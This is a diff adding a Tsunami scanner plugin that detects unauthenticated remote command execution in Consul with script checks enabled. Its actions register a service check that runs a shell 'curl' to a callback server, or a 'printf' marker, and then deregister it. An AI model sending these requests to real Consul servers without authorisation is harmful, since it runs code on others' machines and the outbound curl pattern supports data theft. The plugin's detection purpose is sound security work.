@@ -1,0 +1,174 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Consul_ExposedUI"
+  author: 
+    "Robert Dick (robert@doyensec.com) for templated version, "
+    "Tsunami Team (tsunami-dev@google.com) for original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CONSUL_EXPOSEDUI"
+  }
+  severity: CRITICAL
+  title: "Consul -enable-script-checks remote command execution"
+  description: 
+    "The scanner detected that attackers can execute arbitrary code on this server as Consul is"
+    " configured with -enable-script-checks set to true while the Consul HTTP API is"
+    " unsecured and accessible over the network. In versions of Consul 0.9.0 or earlier,"
+    " script checks are by default on, while in later versions, they are disabled by"
+    " default. See"
+    " https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations"
+    " for more information.\n"
+    "Details on the scanner logic:\n"
+    " The scanner was able to register a service on the Consul instance using the"
+    " /v1/health/service REST endpoint which executed one of the following: \n"
+    "1. A `curl` command to a remote server outside of the network, a technique that can be"
+    " used to exfiltrate data from the server.\n"
+    "2. A `printf` command whose output was then verified by using the /v1/health/service"
+    " REST endpoint.\n"
+    " Note that that the scanner subsequently cleaned up and deregistered the service using"
+    " the /v1/agent/service/deregister/ REST endpoint."
+  recommendation:
+    "Upgrade to a more modern Consul version, enable ACLs, and disable script checks. If your"
+    " require script checks, use the -enable-local-script-checks flag instead. For ACL"
+    " configuration, see https://www.consul.io/docs/security/acl#acl-documentation and"
+    " https://learn.hashicorp.com/tutorials/consul/access-control-setup-production#bootstrapping-acls"
+}
+
+###########
+# ACTIONS #
+###########
+
+# light fingerprint because the title, etc. might vary by language or version.
+# the detector steps are not false positive prone so it should be fine
+
+actions: {
+  name: "fingerprint_consul"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      expect_all: {
+        conditions: [
+          { body: {} contains: "consul-ui" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "execute_payload"
+  http_request: {
+    method: PUT
+    uri: "/v1/agent/service/register?replace-existing-checks=true"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: 
+      '{'
+        '"Name": "TSUNAMI_RCE_TEST",'
+        '"check": {'
+            '"Args": ["sh", "-c", "curl {{ T_CBS_URI }}"],'
+            '"interval": "10s",'
+            '"timeout": "600s"'
+        '}'
+      '}'
+  }
+  cleanup_actions: "unregister_service"
+}
+
+# longer sleep is okay here since we fingerprinted
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 10000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+actions: {
+  name: "unregister_service"
+  http_request: {
+    method: PUT
+    uri: "/v1/agent/service/deregister/TSUNAMI_RCE_TEST"
+  }
+}
+
+# reflective version that works when callback server is disabled
+
+actions: {
+  name: "execute_payload_reflective"
+  http_request: {
+    method: PUT
+    uri: "/v1/agent/service/register?replace-existing-checks=true"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: 
+      '{'
+        '"Name": "TSUNAMI_RCE_TEST",'
+        '"check": {'
+            '"Args": ["sh", "-c", "printf %x 133713371337"],'
+            '"interval": "10s",'
+            '"timeout": "600s"'
+        '}'
+      '}'
+  }
+  cleanup_actions: "unregister_service"
+}
+
+# for the reflective version we have to check the printed statement
+
+actions: {
+  name: "check_executed_reflective"
+  http_request: {
+    method: GET
+    uri: "/v1/health/service/TSUNAMI_RCE_TEST"
+    response: {
+      expect_all: {
+        conditions: [
+          { body: {} contains: "1f21f020c9"}
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_consul",
+    "execute_payload",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+# non-callback workflow
+
+workflows: {
+  actions: [
+    "fingerprint_consul",
+    "execute_payload_reflective",
+    "sleep",
+    "check_executed_reflective"
+  ]
+}
